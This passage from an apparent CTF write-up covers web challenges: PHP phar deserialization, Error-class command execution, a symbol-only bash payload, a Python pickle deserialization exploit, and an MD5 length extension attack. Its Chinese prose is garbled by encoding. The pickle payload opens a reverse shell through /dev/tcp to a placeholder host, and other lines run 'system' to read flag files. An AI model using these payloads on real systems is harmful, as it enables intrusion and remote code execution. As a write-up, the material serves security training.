è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="variable">$object</span> = <span class="variable">$h</span>;</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;print_r(getallheaders());__halt_compiler();&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;ezxy2.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment">//è®¾ç½®stub å¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line">    <span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="variable">$object</span> = <span class="variable">$h</span>;</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¦ç»•è¿‡pharå¤´ï¼Œç”¨ä¸‹é¢çš„è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ezxy2.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line">s = f[:-<span class="number">28</span>]  <span class="comment"># è·å–è¦ç­¾åçš„æ•°æ®</span></span><br><span class="line">h = f[-<span class="number">8</span>:]  <span class="comment"># è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†</span></span><br><span class="line">new_file = s + sha1(s).digest() + h  <span class="comment"># æ•°æ® + ç­¾å + (ç±»å‹ + GBMB)</span></span><br><span class="line">f_gzip = gzip.GzipFile(<span class="string">&quot;ezxyy2.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f_gzip.write(new_file)</span><br><span class="line">f_gzip.close()</span><br></pre></td></tr></table></figure>
<p>è§¦å‘pharï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://phar://xxx</span><br><span class="line">compress.bzip://phar://xxx</span><br><span class="line">zlib:phar://</span><br></pre></td></tr></table></figure>
<p>æˆ‘å¥½åƒç”¨çš„æ˜¯ç¬¬ä¸€ä¸ªè§¦å‘çš„</p>
<p>å…ˆä¼ <code>ezxyy2.jpg</code>æ£€æµ‹è¯·æ±‚å¤´ï¼Œæ‰¾åˆ°æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ </p>
<p>ç„¶åå†ä¼ <code>ezxyy.jpg</code>æ‰“rce</p>
<h1><span id="ezclass"> ezClass</span></h1>
<p>æ°´é¢˜</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨phpçš„Errorç±»å¸¦å‡ºä¿¡æ¯å³å¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Error()-&gt;getMessage()èƒ½å¤Ÿè·å–åˆ°å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=Error&amp;b=Error&amp;aa=system&amp;bb=cat /f*&amp;c=getMessage</span><br></pre></td></tr></table></figure>
<img src="/posts/52072/1.png" class title="awa">
<h1><span id="ÎµzĞ¼kÎµ"> ÎµZ?Â¿Ğ¼@KÎµÂ¿?</span></h1>
<p>æ‰“å¼€f12å‘ç°äº†<code>hint.php</code>ï¼Œå‘ç°åŒ¹é…è§„åˆ™å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^[$|\(|\)|\@|\[|\]|\&#123;|\&#125;|\&lt;|\&gt;|\-]+$/</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ­£åˆ™çš„æ„æ€æ˜¯åŒ¹é…é™¤äº†ä¸­æ‹¬å·ä»¥å†…çš„å­—ç¬¦</p>
<p>ä¹Ÿå°±æ˜¯ç™½åå•åªæœ‰è¿™äº›ç¬¦å·</p>
<p>è€Œä¸”æµ‹è¯•å‘ç°payloadé•¿åº¦&lt;8</p>
<p>ä¹Ÿå°±æ˜¯æœ€å¤šåªèƒ½å¤Ÿç”¨7çš„é•¿åº¦æ¥æ‰§è¡Œ</p>
<p><s>å…¶å®è¿™é‡Œå¯ä»¥çˆ†ç ´()</s></p>
<p><s>ç”Ÿæˆä¸€ä¸ª<code>11^7+11^6+11^5+11^4+11^3+11^2+11</code>çš„å­—å…¸å³å¯((</s></p>
<p><s>ç„¶åæœ¬åœ°æµ‹è¯•()</s></p>
<p>æµ‹è¯•å‘ç°ï¼šmakefileé‡Œçš„<code>$&lt;</code>å°±æ˜¯/flagï¼Œä½†æ˜¯æ²¡æœ‰ç›´æ¥è¯»å–çš„æƒé™</p>
<p>è¿™é‡Œç»“åˆä¸€ä¸‹linuxçš„ä¸œè¥¿ <code>$()</code>ä¹Ÿèƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œ<code>&lt;</code>èƒ½å¤Ÿå°†ä¸œè¥¿è¾“å…¥åˆ°å‘½ä»¤é‡Œï¼Œç›´æ¥è¯»å–ä¸è¡Œå°±ç”¨è¿™æ ·çš„æ–¹å¼è¯»å–ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&lt;/flag)</span><br></pre></td></tr></table></figure>
<p>å°†<code>/flag</code>é‡æ–°å®šå‘åˆ°ä¸€ä¸ª<code>bash -i</code>é‡Œ</p>
<p>å¤–éƒ¨ç›¸å½“äº<code>bash -c</code></p>
<p>å…¶å®å°±ç›¸å½“äº<code>bash -c &quot;bash -i /flag&quot;</code></p>
<p>æ›¿æ¢ä¸€ä¸‹<code>/flag</code>å°±æ˜¯<code>$&lt;</code></p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&lt;$&lt;)</span><br></pre></td></tr></table></figure>
<img src="/posts/52072/image-20240412185232885.png" class title="awa">
<h1><span id="login"> login</span></h1>
<p>å¦‚æœæ³¨æ„åˆ°è¿™ä¸ªé¢˜æœ‰ä¸ª<code>register.php</code>çš„è¯å°±èƒ½å¤Ÿè§£å†³äº†</p>
<p>ä½†æ˜¯wsrxè¿™ä¸ªä¸ç»™æ‰«= =</p>
<p><code>/register.php</code>æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åç™»å½•ï¼Œå‘ç°å•¥ä¹Ÿæ²¡æœ‰</p>
<p>ä¸‹æ„è¯†æ‰“å¼€F12ï¼Œå‘ç°äº†cookieè¿™é‡Œæœ‰ä¸ª<code>Rememberme</code></p>
<p>ä¸‹æ„è¯†ä»¥ä¸ºæ˜¯<code>shiro</code>ï¼Œç„¶åé«˜é«˜å…´å…´åœ°å»æ‹¿shiroçš„å·¥å…·æ‰“ï¼Œå‘ç°æ ¹æœ¬ä¸è¡Œ</p>
<p>man!</p>
<p>ç„¶åæ‰ä»”ç»†çœ‹çœ‹å®ƒçš„cookieï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RememberMe=gASVLAAAAAAAAACMA2FwcJSMBUxvZ2lulJOUKYGUfZQojARuYW1llIwBMZSMA3B3ZJRoBnViLg==</span><br></pre></td></tr></table></figure>
<p>ä¸€å¨AAAAï¼Œå…¶å®è¿™é‡Œæ˜¯pickçš„ç‰¹å¾</p>
<p>çœ‹çœ‹base64</p>
<img src="/posts/52072/image-20240412185825392.png" class title="awa">
<p>èƒ½ç›´æ¥è§£ç æ˜¾ç„¶ä¸å¯¹åŠ²äº†ï¼Œè¿˜æœ‰ä¸€ä¸ªapp</p>
<p>è¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯pythonçš„æœåŠ¡å™¨ï¼Œé‚£è¿™ä¸ªcookieç»è¿‡base64decodeçš„æ˜¯å•¥å‘¢ï¼Ÿ</p>
<p>æœä¸€ä¸‹å°±çŸ¥é“</p>
<p>ç™¾åº¦ï¼š<code>ctf RememberMe</code></p>
<p>å‘ç°æ˜¯pickleçš„ç‰¹å¾ï¼Œè¿™ä¸‹å°±åˆç†å¤šäº†</p>
<p>é‚£ç®€å•ï¼Œæ‰“pickååºåˆ—åŒ–å°±å¯¹äº†ï¼Œå‘ç°è¿˜æœ‰wafçš„ï¼Œç›´æ¥æ‰“ä¸å¤ªè¡Œ</p>
<p>å‘ç°è¿‡æ»¤çš„æ˜¯å…³é”®å­—ï¼Œæ¯”å¦‚<code>import</code>ï¼Œ<code>system</code>ç­‰</p>
<p>ä½†æ˜¯osæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè¿™ä¸ªæ—¶å€™ç›´æ¥ç”¨<code>os.popen</code>å°±å¥½äº†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">opcode = b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span><br><span class="line">ios</span><br><span class="line">popen</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(opcode))</span><br></pre></td></tr></table></figure>
<p>åå¼¹shellï¼Œæºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,session,render_template,redirect,make_response</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Login</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,pwd</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.pwd = pwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkLogin</span>(<span class="params">users,name,pwd</span>):</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">if</span> user.name == name <span class="keyword">and</span> user.pwd == user.pwd:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUserclass</span>(<span class="params">users,name,pwd</span>):</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">if</span> user.name == name <span class="keyword">and</span> user.pwd == user.pwd:</span><br><span class="line">            <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">b&#x27;r&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">app=Flask(__name__)</span><br><span class="line">users = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># pickle</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        RememberMe = request.cookies.get(<span class="string">&#x27;RememberMe&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(RememberMe)</span><br><span class="line">        pickle_data = base64.b64decode(RememberMe)</span><br><span class="line">        <span class="built_in">print</span>(pickle_data)</span><br><span class="line">        <span class="keyword">if</span> waf(pickle_data):</span><br><span class="line">            <span class="built_in">print</span>(pickle_data)</span><br><span class="line">            user_class = pickle.loads(pickle_data)</span><br><span class="line">            <span class="comment">#print(user_class)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello world!  &#123;&#125;&quot;</span>.<span class="built_in">format</span>(user_class.name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf!!!!&quot;</span>      </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;login.php&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># ç™»å½•</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;POST&quot;</span> <span class="keyword">and</span> (username:=request.form.get(<span class="string">&#x27;username&#x27;</span>)) <span class="keyword">and</span> (password:=request.form.get(<span class="string">&#x27;password&#x27;</span>)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(username)==<span class="built_in">str</span> <span class="keyword">and</span> <span class="built_in">type</span>(password)==<span class="built_in">str</span> <span class="keyword">and</span> checkLogin(users,username,password):</span><br><span class="line">            user_class = getUserclass(users,username,password)</span><br><span class="line">            RememberMe = base64.b64encode(pickle.dumps(user_class))</span><br><span class="line">            res=make_response(<span class="string">&quot;Login success! &lt;a href=&#x27;/&#x27;&gt;Click here to redirect.&lt;/a&gt;&quot;</span>);</span><br><span class="line">            res.set_cookie(<span class="string">&#x27;RememberMe&#x27;</span>,RememberMe.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login fail!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨å†Œ</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;POST&quot;</span> <span class="keyword">and</span> (username:=request.form.get(<span class="string">&#x27;username&#x27;</span>)) <span class="keyword">and</span> (password:=request.form.get(<span class="string">&#x27;password&#x27;</span>)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(username)==<span class="built_in">str</span> <span class="keyword">and</span> <span class="built_in">type</span>(password)==<span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">                <span class="keyword">if</span> user.name == username:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Register fail!&quot;</span></span><br><span class="line">            users.append(Login(username,password))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register successs! Your username is &#123;username&#125;.&quot;</span>.<span class="built_in">format</span>(username=username)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register fail!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
<img src="/posts/52072/image-20240412190440718.png" class title="awa">
<h1><span id="give-me-flag"> give me flag</span></h1>
<p>å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ã€‚</p>
<p>è®²ä¸‹åŸç†å§ã€‚</p>
<p>md5çš„ç®—æ³•æµç¨‹</p>
<img src="/posts/52072/1095571-20200907021934829-2120181102.png" class title="awa">
<p>å¯¹äºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶äºŒè¿›åˆ¶é•¿åº¦=<code>å­—ç¬¦ä¸²é•¿åº¦*2*4</code></p>
<p>æ¯”å¦‚å¯¹äº64ä¸ª<code>a</code>ï¼Œå…¶äºŒè¿›åˆ¶é•¿åº¦å°±ä¼šæ˜¯<code>64*2*4=512</code></p>
<p>å¯¹äºMD5ç®—æ³•æ¥è¯´ï¼Œè¦å¯¹åŸæ•°æ®è¿›è¡Œåˆ†å—å¤„ç†ï¼Œä»¥512ä¸ªäºŒè¿›åˆ¶æ•°æ®ä¸ºä¸€å—ï¼Œç›´åˆ°æœ€åçš„æ•°æ®å—ï¼Œåˆ†ä¸ºä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š</p>
<ul>
<li>é•¿åº¦&lt;=448æ—¶ï¼Œåˆ™ä¼šå¡«å……padding(æ— æ„ä¹‰æ•°æ®)ä½¿å…¶é•¿åº¦è¾¾åˆ°448ï¼Œå†æ·»åŠ åŸå§‹æ˜æ–‡æ•°æ®çš„äºŒè¿›åˆ¶é•¿åº¦ä¿¡æ¯ç›´åˆ°512ä½</li>
<li>é•¿åº¦&gt;448ä¸”&lt;512æ—¶ï¼Œå¡«å……paddingåˆ°ä¸‹ä¸€å—çš„448ä½ï¼Œå†æ·»åŠ äºŒè¿›åˆ¶é•¿åº¦ä¿¡æ¯è‡³512ä½</li>
</ul>
<p>å°†æ•°æ®åˆ†å—åå°±å¯ä»¥è¿›è¡Œmd5è¿ç®—äº†</p>
<p>åˆå§‹å‘é‡æ˜¯ç¡®å®šçš„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x67452301</span><br><span class="line">B=0xefcdab89</span><br><span class="line">C=0x98badcfe</span><br><span class="line">D=0x10325476</span><br></pre></td></tr></table></figure>
<p>ç»è¿‡è¿ç®—å³å¯è·å¾—MD5å€¼</p>
<p>è€Œè¿™ä¸ªè¿ç®—ï¼Œå¯¹äºä¸€ä¸ªç¡®å®šçš„md5ï¼Œå¯ä»¥é€šè¿‡ä¸€å®šçš„è§„åˆ™å°†md5è½¬æˆ<code>secret+xxx</code>çš„md5å€¼</p>
<img src="/posts/52072/2.png" class title="awa">
<p>å…·ä½“çš„è¿‡ç¨‹å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yunen/p/13624595.html">æµ…è°ˆHASHé•¿åº¦æ‹“å±•æ”»å‡» - Yunençš„åšå®¢ - åšå®¢å›­ (cnblogs.com)</a>ï¼Œè†œæ‹œå¸ˆå‚…Orz</p>
<p>å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ä¸€èˆ¬éƒ½æ¨èhashpump</p>
<p>ä½†æ˜¯æˆ‘è§‰å¾—hexpandæ›´åŠ å¥½ç”¨ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pcat/p/7668989.html">hexpandå®‰è£…</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-t æ˜æ–‡åŠ å¯†æ–¹å¼</span><br><span class="line">-s md5ç­¾åsignature</span><br><span class="line">-l æ˜æ–‡é•¿åº¦</span><br><span class="line">-m åé¢è¿½åŠ çš„æ•°æ®</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hexpand -t md5 -s abcdefg -l 43 -m xxxx #æŠŠè¿™ä¸ªxxxxæ¢æˆæ—¶é—´æˆ³ï¼Œabcdefgæ¢æˆä½ çš„md5</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ª43æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿå› ä¸ºwebçš„åŠ¨æ€flagæ ¼å¼æ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagname&#123;uuid.uuid4()&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰¾ä¸ªå…¶ä»–é¶æœºçœ‹çœ‹flagæ ¼å¼ä¹Ÿè¡Œï¼Œå‰ç¼€flagnameæ˜¯<code>XYCTF</code>ï¼Œ<code>uuid.uuid4()</code>çš„é•¿åº¦æ˜¯36ï¼ŒåŠ èµ·æ¥å°±æ˜¯43äº†</p>
<p>ç”±äºè¿™é‡Œé¢˜ç›®ç»™çš„æ˜¯<code>$flag.$value.$time</code>ï¼Œå…¶ä¸­<code>$time=time()</code>ï¼Œæˆ‘ä»¬éœ€è¦å¯¹æ—¶é—´æˆ³è¿›è¡Œé¢„æµ‹æäº¤ï¼Œåˆç”±äºæäº¤æ—¶é¶æœºæœ‰å»¶è¿Ÿï¼Œæ‰€ä»¥è¿™é‡Œè¦æµ‹ä»¥ä¸‹è¯·æ±‚çš„æ—¶é—´å·®</p>
<p><code>$value.$time</code>æ˜¯æˆ‘ä»¬è¦è¿½åŠ çš„ä¿¡æ¯ï¼Œä½†æ˜¯<code>$time</code>å·²ç»å†™å¥½äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”Ÿæˆçš„md5æ—¶è¿½åŠ çš„ä¿¡æ¯è¦åˆ æ‰</p>
<img src="/posts/52072/3.png" class title="awa">
